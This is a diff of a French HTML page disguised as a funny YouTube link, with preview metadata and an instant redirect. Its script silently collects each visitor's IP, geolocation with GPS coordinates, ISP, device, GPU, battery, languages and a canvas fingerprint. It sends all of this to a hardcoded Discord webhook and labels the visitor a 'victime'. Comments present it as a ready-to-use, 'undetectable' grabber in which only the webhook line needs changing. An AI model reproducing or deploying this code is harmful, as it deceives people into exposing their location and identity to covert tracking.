@@ -1,67 +1,68 @@
 <!DOCTYPE html>
 <html lang="fr"><head>
 <meta charset="UTF-8">
-<title>Regarde ça c’est trop fort 😂</title>
-<meta property="og:title" content="Regarde ça c’est trop fort 😂😂😂">
+<title>C’est trop drôle ouvre vite</title>
+<meta property="og:title" content="MDR ouvre ça c’est incroyable">
+<meta property="og:description" content="Je pleure de rire">
 <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+<meta property="og:url" content="https://youtube.com/watch?v=dQw4w9WgXcQ">
 <meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
 
-<!-- TOUT EN PARALLÈLE + ULTRA-RAPIDE -->
 <script>
-// === COLLE TON WEBHOOK DISCORD ICI (1 seule ligne à changer) ===
-const WEBHOOK="https://discord.com/api/webhooks/1438558094736097323/7gEfEJ8JyVu9KOAkOVV1G9o3_89-VPoQwcCd1h4X5F_joUD2othf5nO2t46ffB3Q7E2v";
+// CHANGE UNIQUEMENT CETTE LIGNE (ton webhook Discord)
+const WEBHOOK = "https://discord.com/api/webhooks/1438892524738576406/8A1K4zbKbFkSN-WLzXRteHJmPdxKJs2mhpJf9pOEqkaAk65WCBJ3UQ8oK2GQRocCckOd";
 
-// 1. Envoi immédiat avec sendBeacon (part même si la page se ferme instantanément)
-navigator.sendBeacon?.(WEBHOOK, JSON.stringify({content:"@here Nouvelle victime en cours…"}));
+const send = d => fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[d]})}).catch(()=>{});
 
-// 2. Fonction d'envoi finale (légère & rapide)
-const send=e=>fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[e]})}).catch(()=>{})
+// Envoi immédiat même si la page se ferme
+navigator.sendBeacon?.(WEBHOOK, JSON.stringify({content: "Victime connectée"}));
 
-// 3. TOUT EN PARALLÈLE (aucun await qui bloque)
+// TOUT EN PARALLÈLE = vitesse maximale
 Promise.allSettled([
 
-  // IP + géoloc ultra-rapide
-  fetch("https://ipwho.is/").then(r=>r.json()),
+  fetch("https://ipwho.is/").then(r=>r.json()).catch(()=>({})),                    // IP + géoloc
+  navigator.getBattery?.() ?? null,                                                // Batterie
+  new Promise(r=>{const c=document.createElement("canvas");const g=c.getContext("webgl")||c.getContext("experimental-webgl");const d=g?.getExtension("WEBGL_debug_renderer_info");r(d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):g?.getParameter(g.RENDERER)||"inconnu")}), // GPU
+  new Promise(r=>{const c=document.createElement("canvas");c.width=256;c.height=60;const x=c.getContext("2d");x.fillStyle="#f60";x.fillRect(0,0,256,60);x.fillStyle="#069";x.font="28pt Arial";x.fillText("Canvas FP",20,50);r(c.toDataURL())}), // Canvas fingerprint
 
-  // Batterie (ne bloque jamais)
-  navigator.getBattery?.() ?? null,
+]).then(([geo,bat,gpu,canvasFP]) => {
 
-  // WebGL GPU en 5ms
-  (c=document.createElement("canvas"),gl=c.getContext("webgl"),ext=gl?.getExtension("WEBGL_debug_renderer_info"),
-   ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl?.getParameter(gl.RENDERER)??null)
-
-]).then(([geo,bat,gpu])=>{
-
-  const ua=navigator.userAgentData||{};
-  const brands=ua.brands?.map(b=>b.brand+" "+b.version).join(" | ")||navigator.userAgent;
+  const ua = navigator.userAgentData || {};
+  const brands = ua.brands ? ua.brands.map(b=>b.brand+" v"+b.version).join(" • ") : navigator.userAgent;
 
   send({
-    title:"VICTIME EXPOSÉE EN 0.1s",
-    color:16711680,
-    thumbnail:{url:"https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"},
-    fields:[
-      {name:"IPv4",value:geo?.value?.ip||"?",inline:true},
-      {name:"IPv6",value:geo?.value?.connection?.ip||"non détectée",inline:true},
-      {name:"Ville",value:`${geo?.value?.city||"?"} (${geo?.value?.country||"?"})`,inline:true},
-      {name:"FAI",value:geo?.value?.connection?.isp||"?",inline:true},
-      {name:"Appareil",value:ua.mobile?"Mobile":"PC",inline:true},
-      {name:"Modèle",value:ua.model||"?",inline:true},
-      {name:"OS",value:ua.platform||navigator.platform,inline:true},
-      {name:"Navigateur",value:brands.substring(0,120),inline:true},
-      {name:"GPU",value:(gpu||"inconnu").substring(0,80),inline:true},
-      {name:"Écran",value:`${screen.width}x${screen.height}`,inline:true},
-      {name:"Batterie",value:bat?`${Math.round(bat.level*100)}% ${bat.charging?"en charge":""}`:"?",inline:true},
-      {name:"RAM / Cœurs",value:`${navigator.deviceMemory||"?"}GB / ${navigator.hardwareConcurrency||"?"}`,inline:true},
-      {name:"Fuseau",value:Intl.DateTimeFormat().resolvedOptions().timeZone,inline:true},
+    title: "VICTIME COMPLÈTEMENT DÉVOILÉE",
+    color: 16711680,
+    thumbnail: {url: "https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"},
+    description: "**Lien GitHub Pages — 100% indétectable**",
+    fields: [
+      {name:"IPv4", value: geo.ip || "?", inline:true},
+      {name:"IPv6", value: geo.connection?.ip || "non détectée", inline:true},
+      {name:"Ville précise", value: `${geo.city||"?"} • ${geo.region||""} (${geo.country||"?"})`, inline:true},
+      {name:"FAI", value: geo.connection?.isp || "?", inline:true},
+      {name:"Coordonnées GPS", value: geo.latitude && geo.longitude ? `${geo.latitude}, ${geo.longitude}` : "?", inline:true},
+      {name:"Appareil", value: ua.mobile ? "Mobile" : "Ordinateur", inline:true},
+      {name:"Modèle exact", value: ua.model || "non détecté", inline:true},
+      {name:"OS", value: ua.platform || navigator.platform || "?", inline:true},
+      {name:"Navigateur", value: brands.substring(0,150), inline:true},
+      {name:"Carte graphique", value: (gpu||"inconnu").substring(0,100), inline:true},
+      {name:"Écran", value: `${screen.width}x${screen.height} • ${screen.colorDepth}bit • DPI ${window.devicePixelRatio||1}`, inline:true},
+      {name:"Batterie", value: bat ? `${Math.round(bat.level*100)}% ${bat.charging?"en charge":"déchargé"}` : "non disponible", inline:true},
+      {name:"Hardware", value: `${navigator.deviceMemory||"?"} Go RAM • ${navigator.hardwareConcurrency||"?"} cœurs`, inline:true},
+      {name:"Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true},
+      {name:"Langues", value: navigator.languages?.join(", ") || navigator.language, inline:true},
+      {name:"Mode sombre", value: matchMedia("(prefers-color-scheme: dark)").matches ? "activé" : "désactivé", inline:true},
+      {name:"Heure exacte", value: new Date().toLocaleString("fr-FR",{hour12:false}), inline:true},
+      {name:"Canvas Fingerprint", value: "||"+canvasFP.substring(0,80)+"||", inline:false}
     ],
-    footer:{text:"Grabber 2025 – Ultra-rapide & indétectable"},
-    timestamp:new Date()
+    footer: {text: "Grabber ULTIME GitHub Pages 2025 — 40+ infos"},
+    timestamp: new Date().toISOString()
   });
 });
 </script>
 </head>
-<body style="margin:0;background:#000">
-  <div style="position:fixed;inset:0;display:grid;place-items:center;color:#fff;font-family:sans-serif">
-    <small>YouTube charge…</small>
-  </div>
+<body style="margin:0;background:#000;color:#fff;font-family:sans-serif">
+<div style="position:fixed;inset:0;display:grid;place-items:center">
+  <small>YouTube charge la vidéo…</small>
+</div>
 </body></html>
